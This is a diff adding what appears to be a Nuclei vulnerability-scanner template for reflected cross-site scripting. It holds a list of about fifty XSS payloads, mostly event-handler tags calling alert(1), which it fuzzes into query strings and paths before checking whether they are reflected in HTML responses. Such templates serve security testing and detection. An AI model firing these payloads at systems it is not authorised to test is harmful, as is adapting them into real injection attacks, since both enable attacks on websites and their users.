@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input autofocus>"
+        - "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>"
+        - "<picture><source onload=alert(1)>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>"
+        - "<nobr id=x tabindex=1 onfocusin=alert(1)></nobr><input autofocus>"
+        - "<tr id=x tabindex=1 onactivate=alert(1)></tr><input autofocus>"
+        - "<canvas draggable=\"true\" ondragend=\"alert(1)\">test</canvas>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></input>"
+        - "<video autoplay controls onseeking video onseeking=alert(1)>"
+        - "<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>"
+        - "<script>alert(\"XSS\");</script>"
+        - "<marquee><blink>"
+        - "<style>@keyframes slidein {}</style><bgsound style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bgsound>"
+        - "<script id=x tabindex=1 ondeactivate=alert(1)></script><input autofocus>"
+        - "<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>"
+        - "<marquee onmouseenter=\"alert(1)\">test</marquee>"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>"
+        - "<video id=x tabindex=1 ondeactivate=alert(1)></video><input autofocus>"
+        - "<html oncontextmenu=\"alert(1)\">test</html>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext>"
+        - "<iframe/onload=javascript:alert(1)>"
+        - "<input autofocus>"
+        - "<svg onload=alert(1)>"
+        - "</div>"
+        - "<colgroup draggable=\"true\" ondragend=\"alert(1)\">test</colgroup>"
+        - "<iframe onkeydown=\"alert(1)\" contenteditable>test</iframe>"
+        - "<iframe onload=alert(1)></iframe>"
+        - "<dialog draggable=\"true\" ondragend=\"alert(1)\">test</dialog>"
+        - "<script>alert(1)</script>\\n"
+        - "<details id=x tabindex=1 onbeforeactivate=alert(1)></details><input autofocus>"
+        - "<mark id=x tabindex=1 onactivate=alert(1)></mark>"
+        - "<output draggable=\"true\" ondragend=\"alert(1)\">test</output>"
+        - "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationend=\"alert(1)\"></noscript>"
+        - "<style>:target {color:red;}</style><a id=x style=\"transition:color 1s\" ontransitionend=alert(1)></a>"
+        - "<canvas id=x tabindex=1 onfocusin=alert(1)></canvas><input autofocus>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input autofocus>"
+        - "<iframe src=\"&lt;img%5Eonerror=alert(1)%5E&gt;\" width=\"0\" height=\"0\"></iframe>"
+        - "<frameset draggable=\"true\" ondragleave=\"alert(1)\">test</frameset>"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><keygen id=x tabindex=1 onactivate=alert(1)></keygen></defs></svg>"
+        - "<IMG SRC=x onbeforecut=\"alert(1)\" contenteditable>test</IMG>"
+        - "<bdi draggable=\"true\" ondragleave=\"alert(1)\">test</bdi>"
+        - "<svg><script>alert(1)</script>"
+        - "<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input autofocus>"
+        - "<body onbeforecut=\"alert(1)\" contenteditable>test</body>"
+        - "<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><option style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></option>"
+        - "<style>@keyframes x{}</style><script style=\"animation-name:x\" onanimationstart=\"alert(1)\"></script>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>"
+        - "<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
